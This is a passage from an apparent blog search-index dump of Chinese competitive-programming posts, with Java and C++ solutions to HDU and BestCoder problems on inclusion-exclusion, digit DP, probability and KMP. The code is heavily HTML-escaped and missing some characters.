i=1;i&amp;lt;=pri[0]&amp;amp;&amp;amp;pri[i]*pri[i]&amp;lt;=n;i++) if (n%pri[i]==0){ res.add(pri[i]); while(n%pri[i]==0) n/=pri[i]; } if (n&amp;gt;1) res.add(n); return res; } static long solve(long n,Vector&lt;Integer&gt; vec){long res=0L; final int m=vec.size(); for(long i=1L;i&amp;lt;(1L&amp;lt;&amp;lt;m);i++){ boolean tag=false; long tmp=1L; for(int j=0;j&amp;lt;m;j++) if (((1L&amp;lt;&amp;lt;j)&amp;amp;i)&amp;gt;0){ tag^=true; tmp*=vec.get(j).longValue(); } res+=tag?n/tmp:-n/tmp; } return n-res; } public static void main(String[] args) throws IOException{// TODO Auto-generated method stub get_prime(); InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&amp;gt;0){ long a=in.nextLong(); long b=in.nextLong(); int n=in.nextInt(); vec=get_prime_factor(n); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+(solve(b,vec)-solve(a-1,vec))); } out.flush(); out.close(); }}[/code]","link":"/posts/d381e5ac/"},{"title":"hdu 4059 The Boss on Mars 容斥原理 数列通项公式","text":"The Boss on Mars为了高效求出数列的项$latex a_i=\\sum\\limits^n_{i=1} i^4 $，不使用通项公式是无法实现的。另外实际分解所得的质因数的种类并不多，无需浪费大量时间、空间筛选大质数。 [code lang=”java”]/** Aug 27, 2015 2:45:37 PM PrjName:hdu4059 @author Semprathlon/import java.io.;import java.util.*;public class Main { static PrintWriter out=new PrintWriter(System.out); static int maxn=105; static Vector&lt;Integer&gt; vec=new Vector&lt;Integer&gt;(); static Vector&lt;Integer&gt; get_prime_factor(int n){Vector&amp;lt;Integer&amp;gt; res=new Vector&amp;lt;Integer&amp;gt;(); for(int i=2;i*i&amp;lt;=n;i++) if (n%i==0){ res.add(i); while(n%i==0) n/=i; } if (n&amp;gt;1) res.add(n); return res; } final static long mod=1000000007L; static long pow(long n,long m,long mod){long res=1L; while(m&amp;gt;0L){ if ((m&amp;amp;1L)&amp;gt;0L) res=res*n%mod; n=n*n%mod; m&amp;gt;&amp;gt;=1; } return res; } static long div(long a,long b,long mod){return a*pow(b,mod-2,mod)%mod; } static long sum(int n,long mod){long res=n; res*=2*n+1;res%=mod; res*=n+1;res%=mod; res*=(3L*n*n+3*n-1)%mod;res%=mod; return div(res,30,mod); } static long solve(Vector&lt;Integer&gt; vec,int n){long res=0L; int m=vec.size(); for(int i=1;i&amp;lt;(1L&amp;lt;&amp;lt;m);i++){ boolean tag=false; int tmp=1; for(int j=0;j&amp;lt;m;j++) if (((1L&amp;lt;&amp;lt;j)&amp;amp;i)&amp;gt;0){ tmp*=vec.get(j); tmp%=mod; tag^=true; } res=res+(tag?1:-1)*(pow(tmp,4,mod)*sum(n/tmp,mod)%mod); res%=mod; } return res; } public static void main(String[] args) throws IOException{// TODO Auto-generated method stub InputReader in=new InputReader(System.in); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); Vector&amp;lt;Integer&amp;gt; v=get_prime_factor(n); out.println((sum(n,mod)-solve(v,n)+mod)%mod); } out.flush(); out.close(); } }[/code]另有一个未知的通过矩阵快速幂计算该数列项的方法（求以下矩阵的n次方）。||||||||—|—|—|—|—|—||1|1|4|6|4|1||0|1|4|6|4|1||0|0|1|3|3|1||0|0|0|1|2|1||0|0|0|0|1|1||0|0|0|0|0|1|[code lang=”cpp”]void init(){ int i,j; //构造矩阵 ONE.mat[1][1]=1;ONE.mat[1][2]=1;ONE.mat[1][3]=4; ONE.mat[1][4]=6;ONE.mat[1][5]=4;ONE.mat[1][6]=1; ONE.mat[2][1]=0;ONE.mat[2][2]=1;ONE.mat[2][3]=4; ONE.mat[2][4]=6;ONE.mat[2][5]=4;ONE.mat[2][6]=1; ONE.mat[3][1]=0;ONE.mat[3][2]=0;ONE.mat[3][3]=1; ONE.mat[3][4]=3;ONE.mat[3][5]=3;ONE.mat[3][6]=1; ONE.mat[4][4]=1;ONE.mat[4][5]=2;ONE.mat[4][6]=1; ONE.mat[5][4]=0;ONE.mat[5][5]=1;ONE.mat[5][6]=1; ONE.mat[6][6]=1; yu[0]=0; yu[1]=1; LL x; for(i=2;i&lt;maxn;i++)//预处理1~200W的sum[x] { x=i%MOD; x=xi; x=x%MOD; x=xi; x=x%MOD; x=xi; x=x%MOD; yu[i]=yu[i-1]+x; yu[i]=yu[i]%MOD; } AA[1]=ONE; for(i=2;i&lt;30;i++)AA[i]=AA[i-1]AA[i-1];}[/code]最后以这种方式取得计算结果(再乘上以下矩阵)：||||||||—|—|—|—|—|—||1|0|0|0|0|0||1|0|0|0|0|0||1|0|0|0|0|0||1|0|0|0|0|0||1|0|0|0|0|0||1|0|0|0|0|0|[code lang=”cpp”]matrix A;LL kan(LL x)//求sum[x]{ if(x&lt;maxn)return yu[x]; matrix OP; for(int i=1;i&lt;=6;i++)OP.mat[i][1]=1; A=powmul(ONE,x-1); OP=A*OP; return OP.mat[1][1];}[/code]","link":"/posts/a0b734c1/"},{"title":"hdu 3388 Coprime 容斥原理 二分查找","text":"Coprime刚开始不知道用二分，因为没有发现序列单调不下降的性质；留意二分查找需找到下界。二分查找起点的右边界取m*n是不够的，实际查找到的结果可能远大于该值。[code lang=”java”]/** Aug 27, 2015 9:25:32 PM PrjName:hdu3388 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args/static Vector&lt;Integer&gt; v1=new Vector&lt;Integer&gt;();static Vector&lt;Integer&gt; v2=new Vector&lt;Integer&gt;();static HashSet&lt;Integer&gt; st=new HashSet&lt;Integer&gt;();static Integer[] fac=new Integer[0];static Vector&lt;Integer&gt; get_prime_factor(int n){ Vector&lt;Integer&gt; res=new Vector&lt;Integer&gt;(); res.clear(); for(int i=2;ii&lt;=n;i++)if (n%i==0){ res.add(i); while(n%i==0) n/=i; } if (n&gt;1) res.add(n); return res;}static long check(long n){ long res=0L; int m=fac.length; for(int i=1;i&lt;(1L&lt;&lt;m);i++){long tmp=1L; boolean tag=false; for(int j=0;j&amp;lt;m;j++) if (((1L&amp;lt;&amp;lt;j)&amp;amp;i)&amp;gt;0L){ tmp*=fac[j].longValue(); tag^=true; } res+=tag?n/tmp:-n/tmp; } return n-res;}static long bisearch(long low,long high,long key){ long l=low,r=high,mid; while(l&lt;r){mid=(l+r)&amp;gt;&amp;gt;1; if (check(mid)&amp;gt;=key) r=mid; else l=mid+1; } return l;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T–&gt;0){int m=in.nextInt(); int n=in.nextInt(); int k=in.nextInt(); v1=get_prime_factor(m); v2=get_prime_factor(n); st.clear(); for(Integer e:v1.toArray(new Integer[0])) st.add(e); for(Integer e:v2.toArray(new Integer[0])) st.add(e); fac=st.toArray(new Integer[0]); out.println(&amp;quot;Case &amp;quot;+(++cas)+&amp;quot;: &amp;quot;+bisearch(1, 0x3f3f3f3f3f3f3f3fL, k)); } out.flush(); out.close();} }[/code]较为神奇的是，把以上代码的check()函数（实现容斥原理的计算）替换为以下实现后，效率大有提升。[code lang=”java”]static long check(long n,int low){ long sum=0L; for(int i=low;i&lt;fac.length;i++) sum+=n/fac[i].longValue()-check(n/fac[i].longValue(),i+1); return sum; }[/code]","link":"/posts/a308b9e6/"},{"title":"Bestcoder","text":"迟到了半小时开打，不然rank还可以更好看点…… 1001 Rikka with GraphTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 65536/65536 K (Java/Others)[code lang=”java”]/** Aug 29, 2015 7:39:29 PM PrjName:Bc53-01 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){int n=(int)in.nval; in.nextToken(); int m=(int)in.nval; boolean has=false; //out.println(n+&amp;quot;-&amp;quot;+m); for(int i=1;i&amp;lt;=m;i++){ in.nextToken(); int u=(int)in.nval; in.nextToken(); int v=(int)in.nval; if (u==1&amp;amp;&amp;amp;v==n||u==n&amp;amp;&amp;amp;v==1) has=true; } if (has) out.println(1+&amp;quot; &amp;quot;+n*(n-1)/2); else out.println(1+&amp;quot; &amp;quot;+1); } out.flush(); out.close();}}[/code]如果点1与点n直接相连，那么就是距离最短了。 1002 Rikka with Tree要同时满足不同与相似，就是要求结点数相等，各结点到树根1的距离分别相等（即深度分别相同），且存在父节点不同的结点。可以说就是判断同一深度上的结点互换后是否能得到新的结构。若有某一深度上的结点数多于一个，那么大概可以通过同层互换获得新的结构。[code lang=”java”]/** Aug 29, 2015 7:59:14 PM PrjName:Bc53-02 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxn=2010;static Graph G=new Graph(maxn);static int[] dep;static HashSet&lt;Integer&gt; st=new HashSet&lt;Integer&gt;();static void bfs(int st){ Queue&lt;Integer&gt; que=new LinkedList&lt;Integer&gt;(); que.add(st); while(!que.isEmpty()){int u=que.poll(); for(int i=G.h[u];i&amp;gt;-1;i=G.edge[i].next){ int v=G.edge[i].to; if (dep[v]&amp;gt;0) continue; dep[v]=dep[u]+1; que.add(v); } }}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){int n=(int)in.nval; G.clear(); dep=new int[n+1]; dep[1]=1; for(int i=1;i&amp;lt;n;i++){ in.nextToken(); int u=(int)in.nval; in.nextToken(); int v=(int)in.nval; G.add(u, v); G.add(v, u); } bfs(1); boolean ans=true; st.clear(); for(int i=1;i&amp;lt;=n;i++) if (st.contains(dep[i])){ ans=false; break; } else st.add(dep[i]); out.println(ans?&amp;quot;YES&amp;quot;:&amp;quot;NO&amp;quot;); } out.flush(); out.close();} }class Edge{ int to,next; Edge(int _u,int _v){ to=_u;next=_v; }}class Graph{ int[] h; int sz; Edge[] edge; Graph(int size){ sz=size; h=new int[sz+1]; edge=new Edge[sz+1]; Arrays.fill(h, -1); h[0]=0; } void clear(){ h=new int[sz+1]; edge=new Edge[sz+1]; Arrays.fill(h, -1); h[0]=0; } void add(int u,int v){ edge[h[0]]=new Edge(v,h[u]); h[u]=h[0]++; }}[/code]然而错了。适当地列举一些情况，发现若树的深度仅有2，那么它始终是特殊的。可是加上这一判断仍不够。进一步的举例发现，若树上非最底层有某一层结点多于一个，就能变换形成新结构[code lang=”java”]/** Aug 29, 2015 7:59:14 PM PrjName:Bc53-02 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxn=2010;static Graph G=new Graph(maxn);static int[] dep;static HashSet&lt;Integer&gt; st=new HashSet&lt;Integer&gt;();static void bfs(int st){ Queue&lt;Integer&gt; que=new LinkedList&lt;Integer&gt;(); que.add(st); while(!que.isEmpty()){int u=que.poll(); for(int i=G.h[u];i&amp;gt;-1;i=G.edge[i].next){ int v=G.edge[i].to; if (dep[v]&amp;gt;0) continue; dep[v]=dep[u]+1; que.add(v); } }}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); while(in.nextToken()!=StreamTokenizer.TT_EOF){int n=(int)in.nval; G.clear(); dep=new int[n+1]; dep[1]=1; for(int i=1;i&amp;lt;n;i++){ in.nextToken(); int u=(int)in.nval; in.nextToken(); int v=(int)in.nval; G.add(u, v); G.add(v, u); } bfs(1); boolean ans=true; st.clear(); int maxd=0; for(int i=1;i&amp;lt;=n;i++) maxd=Math.max(dep[i], maxd); for(int i=1;i&amp;lt;=n;i++) if (st.contains(dep[i])){ if (dep[i]&amp;lt;maxd){ ans=false; break; } } else st.add(dep[i]); if (maxd&amp;lt;3) ans=true; out.println(ans?&amp;quot;YES&amp;quot;:&amp;quot;NO&amp;quot;); } out.flush(); out.close();} }class Edge{ int to,next; Edge(int _u,int _v){ to=_u;next=_v; }}class Graph{ int[] h; int sz; Edge[] edge; Graph(int size){ sz=size; h=new int[sz+1]; edge=new Edge[sz+1]; Arrays.fill(h, -1); h[0]=0; } void clear(){ h=new int[sz+1]; edge=new Edge[sz+1]; Arrays.fill(h, -1); h[0]=0; } void add(int u,int v){ edge[h[0]]=new Edge(v,h[u]); h[u]=h[0]++; }}[/code]这与题解中所说的“一棵树是独特的当且仅当任意处于每一个深度的点数是1 1 1 1 … 1 1 x”相符（我个人将这种形态称作“呈扫帚状”）","link":"/posts/97dd1257/"},{"title":"hdu 2089 数位dp","text":"不要62具有教科书性质的数位dp应用实例。[code lang=”java”]/** Aug 31, 2015 9:57:30 PM PrjName:hdu2089 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxl=7;static int[][] f;static int[] digit;static void init(){ f=new int[maxl+1][10]; f[0][0]=1; for(int i=1;i&lt;=maxl;i++)//从低位到高位！for(int j=0;j&amp;lt;10;j++) for(int k=0;k&amp;lt;10;k++) if (k!=4&amp;amp;&amp;amp;!(j==6&amp;amp;&amp;amp;k==2)) f[i][j]+=f[i-1][k]; }static int solve(int n){ //if (n==0) return 1; digit=new int[maxl+1]; while(n&gt;0){digit[++digit[0]]=n%10; n/=10; } int res=0; for(int i=digit[0];i&gt;0;i–){//从高位到低位！for(int j=0;j&amp;lt;digit[i];j++) if(j!=4&amp;amp;&amp;amp;!(j==2&amp;amp;&amp;amp;digit[i+1]==6))//限制前j位，枚举后digit[0]-j位 res+=f[i][j]; if(digit[i]==4||digit[i]==2&amp;amp;&amp;amp;digit[i+1]==6) break; } return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); init(); while(in.nextToken()!=StreamTokenizer.TT_EOF){int n=(int)in.nval; in.nextToken(); int m=(int)in.nval; if (n==0&amp;amp;&amp;amp;m==0) break; //out.println(solve(n)+&amp;quot; &amp;quot;+solve(m+1)); out.println(solve(m+1)-solve(n)); } out.flush(); out.close();}}[/code][code lang=”java”]/** Sep 1, 2015 8:57:53 PM PrjName:hdu2089-2 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int maxl = 8;static int[][] f, g;static int[] digit;static void init() { f = new int[maxl + 1][10]; f[0][0] = 1; g = new int[maxl + 1][10]; g[0][0] = 1;}static void getd(int n) { digit = new int[maxl + 1]; while (n &gt; 0) { digit[++digit[0]] = n % 10; n /= 10; }}static int dfs(int d, int r, boolean c) { if (d == 0) { if (c) f[d + 1][r]++; return 0; } if (!(f[d + 1][r] &gt; 0)) { int add = 0; int up = c ? 9 : digit[d]; for (int i = 0; i &amp;lt;= up; i++) if (!(r == 6 &amp;amp;&amp;amp; i == 2)) { if (!(f[d][i] &amp;gt; 0)) dfs(d - 1, i, c || i != up); if (i != 4) add += f[d][i]; } f[d + 1][r] += add; } int res = digit[d] == 4 || digit[d] == 2 &amp;&amp; digit[d + 1] == 6 ? 0 : dfs(d - 1, 0, false); for (int i = 0; i &lt; digit[d]; i++) if (i != 4 &amp;amp;&amp;amp; !(i == 2 &amp;amp;&amp;amp; digit[d + 1] == 6)) res += f[d][i]; return res;}static int solve(int n) { int res = 0; getd(n); return dfs(digit[0], 0, true);}public static void main(String[] args) throws IOException { // TODO Auto-generated method stub StreamTokenizer in = new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out = new PrintWriter(System.out); init(); while (in.nextToken() != StreamTokenizer.TT_EOF) { int n = (int) in.nval; in.nextToken(); int m = (int) in.nval; if (n == 0 &amp;amp;&amp;amp; m == 0) break; out.println(solve(m + 1) - solve(n)); } out.flush(); out.close();}}[/code] 为何生成与统计分两步走？因为前i+1位的各种情况以前i位为依据生成，不能打断这个递推的连续性。待统计时再筛选所需。 为何solve(m+1)?便捷化处理，搜集&lt;m+1的答案即≤m的答案。 为何这个记忆化搜索极易写挂？许多人根据数字的可选或不可选来划分状态，而此处为了清晰的体现数位的筛选辄以数字为状态。状态的更新与统计仍是分离的。","link":"/posts/d6d71da6/"},{"title":"2014 ACM&#x2F;ICPC Asia Regional Anshan Online","text":"hdu 5001 Walk 概率dp其实就是这么直白，正难则反[code lang=”java”]/** Sep 2, 2015 8:29:38 PM PrjName:hdu5001 @author Semprathlon/import java.io.;import java.util.*; public class Main { /** * @param args */ static int n, m, d; static int[] deg; static int[][] u; static double[][] f; static double solve(int x) { f = new double[d + 1][n + 1]; for (int i = 1; i &amp;lt;= n; i++) f[0][i] = 1.0 / n; for (int i = 1; i &amp;lt;= d; i++) for (int j = 1; j &amp;lt;= n; j++) { if (j == x) continue; for (int k = 1; k &amp;lt;= u[j][0]; k++) f[i][u[j][k]] += f[i - 1][j] / u[j][0]; } double ans = 0; for (int i = 1; i &amp;lt;= n; i++) if (i != x) ans += f[d][i]; return ans; } public static void main(String[] args) throws IOException { // TODO Auto-generated method stub InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- &amp;gt; 0) { n = in.nextInt(); m = in.nextInt(); d = in.nextInt(); u = new int[n + 1][m + 1]; deg = new int[n + 1]; for (int i = 1; i &amp;lt;= m; i++) { int x = in.nextInt(); deg[x]++; int y = in.nextInt(); deg[y]++; u[x][++u[x][0]] = y; u[y][++u[y][0]] = x; } for (int i = 1; i &amp;lt;= n; i++) out.println(String.format(&amp;quot;%.6f&amp;quot;, solve(i))); } out.flush(); out.close(); } }[/code]不知为何，printf+格式字符串会出现莫名的PE hdu 4998 Rotate[code lang=”java”]/** Sep 2, 2015 5:58:24 PM PrjName:hdu4998 @author Semprathlon/import java.io.;import java.util.*; public class Main { /** * @param args */ final static double eps = 1e-5; final static double pi = Math.acos(-1.0); static int dcmp(double d) { if (Math.abs(d) &amp;lt; eps) return 0; return d &amp;gt; 0 ? 1 : -1; } public static void main(String[] args) throws IOException { // TODO Auto-generated method stub InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- &amp;gt; 0) { int n = in.nextInt(); Point p1 = new Point(0, 0), q1 = new Point(p1); Point p2 = new Point(0, 1), q2 = new Point(p2); for (int i = 1; i &amp;lt;= n; i++) { double x = in.nextDouble(); double y = in.nextDouble(); double a = in.nextDouble(); q1 = q1.rotate(x, y, a); q2 = q2.rotate(x, y, a); } Vector v1 = new Vector(p1, q1).normal(); Vector v2 = new Vector(p2, q2).normal(); Point o = Vector.GetLineIntersection(Point.mid(p1, q1), v1, Point.mid(p2, q2), v2); double ans = Vector.angle(o, p1, q1); if (Vector.cross(new Vector(o, p1), new Vector(o, q1)) &amp;lt; 0) ans = 2 * pi - ans; out.printf(&amp;quot;%.5f %.5f %.5f\\n&amp;quot;, o.x, o.y, ans); } out.flush(); out.close(); } static class Point { double x, y; Point() { } Point(double _x, double _y) { x = _x; y = _y; } Point(Point p) { this(p.x, p.y); } boolean equals(Point p) { return dcmp(x - p.x) == 0 &amp;amp;&amp;amp; dcmp(y - p.y) == 0; } Point add(Point r) { return new Point(x + r.x, y + r.y); } Point sub(Point r) { return new Point(x - r.x, y - r.y); } Point mul(double r) { return new Point(x * r, y * r); } Point move(double dx, double dy) { return new Point(x + dx, y + dy); } Point rotate(double a) { return new Point(x * Math.cos(a) - y * Math.sin(a), x * Math.sin(a) + y * Math.cos(a)); } Point rotate(double dx, double dy, double a) { return this.move(-dx, -dy).rotate(a).move(dx, dy); } static Point mid(Point a, Point b) { return new Point((a.x + b.x) / 2.0, (a.y + b.y) / 2.0); } } static class Vector extends Point { Vector(double _x, double _y) { x = _x; y = _y; } Vector(Point a, Point b) { this(b.x - a.x, b.y - a.y); } Vector(Point p) { this(p.x, p.y); } static double angle(Vector a, Vector b) { return Math.acos(dot(a, b) / a.length() / b.length()); } static double angle(Point o, Point a, Point b) { return angle(new Vector(o, a), new Vector(o, b)); } double dot(Vector r) { return x * r.x + y * r.y; } double cross(Vector r) { return x * r.y - y * r.x; } double length() { return Math.sqrt(this.dot(this)); } Vector normal() { double len = this.length(); return new Vector(-y / len, x / len); } static Point GetLineIntersection(Point p, Vector v, Point q, Vector w) {// 求直线交点 Vector u = new Vector(p.sub(q)); double t = cross(w, u) / cross(v, w); return p.add(v.mul(t)); } static Point GetLineIntersection(Point p, Point v, Point q, Point w) { return GetLineIntersection(p, new Vector(v), q, new Vector(w)); } static Vector add(Vector a, Vector b) { return new Vector(a.add(b)); } static double dot(Vector a, Vector b) { return a.dot(b); } static double cross(Vector a, Vector b) { return a.cross(b); } static double cross(Point o, Point a, Point b) { return cross(new Vector(o, a), new Vector(o, b)); } static double length(Vector r) { return r.length(); } } }[/code]说得好像很繁的样子 hdu 5000[code lang=”java”]/** Sep 3, 2015 9:43:43 PM PrjName:hdu5000 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/final static int mod=1000000007;static int[] a,f;public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T–&gt;0){int n=in.nextInt(); int sum=0; a=new int[n+1]; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); sum+=a[i]; } sum&amp;gt;&amp;gt;=1; f=new int[sum+1]; f[0]=1; for(int i=1;i&amp;lt;=n;i++) for(int j=sum;j&amp;gt;=0;j--) for(int k=1;k&amp;lt;=j&amp;amp;&amp;amp;k&amp;lt;=a[i];k++){ f[j]+=f[j-k]; f[j]%=mod; } out.println(f[sum]); } out.flush(); out.close();} }class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader( new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer( reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code]非常奇怪，找到sum/2可得最优解这个规律就算是成功了一半了","link":"/posts/65c4bded/"},{"title":"hdu 1204 糖果大战 概率过程","text":"hdu 1204通过本题接触到了存在于《概率论与数理统计》教材，但是不在学校教学范围内的概率过程知识。接受这种新的认知，才能避免落入高中局限的概率观的窠臼。[code lang=”java”]/** Sep 5, 2015 9:45:04 PM PrjName:hdu1204 @author Semprathlon/import java.awt.Toolkit;import java.io.;import java.util.*;public class Main { /** @param args*/static double pow(double n,int m){ double res=1; while(m&gt;0){if ((m&amp;amp;1)&amp;gt;0) res=res*n; n=n*n; m&amp;gt;&amp;gt;=1; } return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){int n=in.nextInt(); int m=in.nextInt(); double p=in.nextDouble(); double q=in.nextDouble(); if (n==0) out.println(&amp;quot;0.00&amp;quot;); else if (m==0) out.println(&amp;quot;1.00&amp;quot;); else if (p==0||q==1) out.println(&amp;quot;0.00&amp;quot;); else if (p==1||q==0) out.println(&amp;quot;1.00&amp;quot;); else{ double k=q*(1.0-p)/p/(1.0-q); double ans=p==q?n*1.0/(m+n):(1.0-pow(k, n))/(1.0-pow(k, n+m)); out.println(String.format(&amp;quot;%.2f&amp;quot;, ans)); } } out.flush(); out.close();}}[/code]","link":"/posts/a8ac2317/"},{"title":"hdu 2203 亲和串 KMP","text":"亲和串[code lang=”java”]/** Sep 8, 2015 10:56:55 PM PrjName:hdu2203 @author Semprathlon/import java.io.;import java.util.*;public class Main { public static void main(String[] args) throws IOException{// TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); while(in.nextLine()!=null){ String s=in.next(); s=new String(s+s); String t=in.next(); out.println(KMP.Index(s, t)&amp;gt;-1?&amp;quot;yes&amp;quot;:&amp;quot;no&amp;quot;); } out.flush(); out.close(); } }class KMP{ static int next[]; static void getNext(String T){ next=new int[T.length()+1]; int j = 0, k = -1; next[0] = -1; while(j &lt; T.length()) if(k == -1 || T.charAt(j) == T.charAt(k)) next[++j] = ++k; else k = next[k]; } static int Index(String S,String T) { int i = 0, j = 0; getNext(T); for(i = 0; i &amp;lt; S.length()&amp;amp;&amp;amp;j&amp;lt;T.length(); i++) { while(j &amp;gt; 0 &amp;amp;&amp;amp; S.charAt(i) != T.charAt(j)) j = next[j]; if(S.charAt(i) == T.charAt(j)) j++; } if(j == T.length()) return i - T.length(); else return -1; } static int Count(String S,String T) { int res = 0,j=0; if(S.length() == 1 &amp;amp;&amp;amp; T.length() == 1) { if(S.charAt(0) == T.charAt(0)) return 1; else return 0; } getNext(T); for(int i = 0; i &amp;lt; S.length(); i++) { while(j &amp;gt; 0 &amp;amp;&amp;amp; S.charAt(i) != T.charAt(j)) j = next[j]; if(S.charAt(i) == T.charAt(j)) j++; if(j == T.length()) { res++; j = next[j]; } } return res; } }[/code]","link":"/posts/c5eccff6/"},{"title":"Bestcoder","text":"1001 A problem of sorting[code lang=”java”]/** Sep 5, 2015 7:07:52 PM PrjName:Bc54-01 @author Semprathlon/import java.io.;import java.util.*;public class Main { final static int maxn=116; static String s; static Vector&lt;String&gt;[] vec=new Vector[maxn]; public static void main(String[] args) throws IOException{// TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); for(int i=0;i&amp;lt;maxn;i++) vec[i]=new Vector&amp;lt;String&amp;gt;(); BufferedReader br=new BufferedReader(new InputStreamReader(System.in)); int T=Integer.parseInt(br.readLine()); while(T--&amp;gt;0){ for(int i=0;i&amp;lt;maxn;i++) vec[i].clear(); int n=Integer.parseInt(br.readLine()); for(int i=1;i&amp;lt;=n;i++){ s=new String(br.readLine()); int y=0,tmp=1,j; for(j=s.length()-1;j&amp;gt;0;j--) if (s.charAt(j)&amp;gt;=&apos;0&apos;&amp;amp;&amp;amp;s.charAt(j)&amp;lt;=&apos;9&apos;){ y+=tmp*(s.charAt(j)-&apos;0&apos;); tmp*=10; } else break; s=s.substring(0, j); vec[y-1900].add(s); } for(int i=maxn-1;i&amp;gt;=0;i--) for(int j=0;j&amp;lt;vec[i].size();j++) out.println(vec[i].get(j)); } out.flush(); out.close(); }}[/code] 1002 The Factor[code lang=”java”]/** Sep 5, 2015 7:30:23 PM PrjName:Bc54-02 @author Semprathlon/import java.io.;import java.util.*;public class Main { final static int maxn=109000; static int[] a; static int[] pri,phi,fstp; static void get_prime(){pri=new int[maxn]; fstp=new int[maxn]; phi=new int[maxn]; phi[1]=1; for(int i=2;i&amp;lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; phi[i]=i-1; } for(int j=1;j&amp;lt;=pri[0]&amp;amp;&amp;amp;i*pri[j]&amp;lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; //if (fstp[i]==pri[j]){ if (i%pri[j]==0){ phi[k]=phi[i]*pri[j]; break; } else phi[k]=phi[i]*(pri[j]-1); } } } static int get_fstp(int n){if (n&amp;lt;maxn) return fstp[n]&amp;gt;0?fstp[n]:n; for(int i=2;i&amp;lt;maxn;i++) if (n%i==0) return fstp[i]&amp;gt;0?fstp[i]:i; return 0; } static Vector&lt;Integer&gt; get_prime_factor(int n){Vector&amp;lt;Integer&amp;gt; res=new Vector&amp;lt;Integer&amp;gt;(); while(n&amp;gt;1&amp;amp;&amp;amp;fstp[n]&amp;gt;0){ res.add(fstp[n]); n/=fstp[n]; } if (n&amp;gt;1) res.add(n); return res; } static Vector&lt;Integer&gt; v=new Vector&lt;Integer&gt;(); static Integer[] f; public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); get_prime(); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); v.clear(); a=new int[n+1]; for(int i=1;i&amp;lt;=n;i++){ a[i]=in.nextInt(); if (a[i]==1) continue; int tmp=get_fstp(a[i]); v.add(tmp); if (a[i]/tmp&amp;gt;1) v.add(get_fstp(a[i]/tmp)); } /*v.sort(new Comparator&amp;lt;Integer&amp;gt;() { public int compare(Integer o1,Integer o2){ return Integer.compare(o1, o2); } });*/ f=v.toArray(new Integer[0]); Arrays.sort(f); if (v.size()&amp;lt;2) out.println(-1); else out.println(f[0]*f[1]); } out.flush(); out.close(); }}[/code]⬆️当时想太多了啊，何必把找到的因子全存进vector啊，白白吃了个RE……（测试还发现HDU尚不支持Vector的sort方法，还未支持到Java7？）[code lang=”java”]/** Sep 8, 2015 16:02:23 PM PrjName:Bc54-02 @author Semprathlon/import java.io.;import java.util.*;public class Main { final static int maxn=45000; static int[] a; static int[] pri,fstp; static void get_prime(){pri=new int[maxn]; fstp=new int[maxn]; for(int i=2;i&amp;lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; } for(int j=1;j&amp;lt;=pri[0]&amp;amp;&amp;amp;i*pri[j]&amp;lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; if (i%pri[j]==0) break; } } } static int get_fstp(int n){if (n&amp;lt;maxn) return fstp[n]&amp;gt;0?fstp[n]:n; for(int i=2;i&amp;lt;maxn;i++) if (n%i==0) return fstp[i]&amp;gt;0?fstp[i]:i; return n; } static int max1,max2,sum; static void init(){max1=max2=0x3fffffff;sum=0; } static void update(int s){if (s&amp;lt;max1){ max2=max1;max1=s; } else max2=Math.min(max2, s); sum++; } public static void main(String[] args) throws IOException{InputReader in=new InputReader(System.in); PrintWriter out=new 